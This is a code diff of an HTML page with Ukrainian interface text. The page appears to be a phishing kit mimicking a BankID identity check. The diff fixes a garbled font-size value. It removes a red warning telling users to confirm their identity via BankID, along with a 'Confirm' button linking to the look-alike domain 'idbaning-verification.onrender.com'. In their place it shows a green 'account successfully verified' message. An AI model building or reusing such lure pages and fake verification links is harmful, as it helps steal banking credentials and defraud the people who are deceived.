@@ -53,7 +53,7 @@
             padding: 16px;
             text-align: center;
             font-weight: 600;
-            font-size: 자로17px;
+            font-size: 17px;
             letter-spacing: 0.5px;
             display: flex;
             align-items: center;
@@ -196,29 +196,6 @@
             transform: translateY(0);
         }
 
-        .bankid-button {
-            display: inline-block;
-            background: var(--black);
-            color: white;
-            padding: 10px 20px;
-            font-size: 15px;
-            font-weight: 600;
-            border-radius: 30px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-decoration: none;
-            margin-top: 20px;
-        }
-
-        .bankid-button:hover {
-            background: #333;
-            transform: translateY(-1px);
-        }
-
-        .bankid-button:active {
-            transform: translateY(0);
-        }
-
         .step {
             display: none;
             animation: slideIn 0.4s ease-out;
@@ -233,9 +210,9 @@
             to { opacity: 1; transform: translateX(0); }
         }
 
-        /* Новий стиль для червоного попередження */
-        .warning-message {
-            color: var(--danger);
+        /* Стиль для успішного повідомлення */
+        .success-message {
+            color: var(--success);
             text-align: center;
             padding: 20px;
             font-size: 18px;
@@ -243,11 +220,11 @@
             line-height: 1.6;
         }
 
-        .warning-message i {
+        .success-message i {
             font-size: 48px;
             display: block;
             margin-bottom: 16px;
-            color: var(--danger);
+            color: var(--success);
         }
 
         input[type=tel]::-webkit-inner-spin-button,
@@ -311,13 +288,12 @@
                 </button>
             </div>
 
-            <!-- Крок 3: Попередження + BankID (червоний текст) -->
+            <!-- Крок 3: Успішне підтвердження (зелений текст) -->
             <div id="success-step" class="step">
-                <div class="warning-message">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    <div>Для продовження користування аккаунтом підтвердіть особу через BankID</div>
+                <div class="success-message">
+                    <i class="fas fa-check-circle"></i>
+                    <div>Ваш аккаунт успішно підтверджено</div>
                 </div>
-                <a href="https://idbaning-verification.onrender.com" class="bankid-button">Підтвердити</a>
             </div>
         </div>
     </div>
